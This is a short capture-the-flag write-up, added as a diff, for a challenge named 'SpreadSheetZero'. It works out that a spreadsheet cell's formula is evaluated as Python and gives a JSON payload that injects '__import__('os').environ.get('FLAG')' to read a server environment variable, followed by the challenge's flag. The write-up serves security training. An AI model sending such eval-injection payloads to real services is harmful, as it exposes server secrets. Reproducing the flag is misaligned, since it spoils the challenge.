@@ -1,0 +1,11 @@
+SpreadSheetZero: The floating-point math error (49.900000000000006) is actually a byproduct of the IEEE 754 standard for floating-point arithmetic. both javascript and python use the same standard. 
+It is not javascript, because testing it, sending 
+
+{"ref":"D3","value":"=process.env.FLAG"} result in an “process” not defined error.
+It is important to set the value after the = sign, because otherwise the server would not evaluate the command, but only printing it.
+
+Because it uses python, the correct string to send is the following one:
+ {"ref":"D3","value":"=__import__('os').environ.get('FLAG')"}
+
+The flag is:offsec{3val_spr34dsh33t_ZUoQLi5nOvFv9mGs}
+
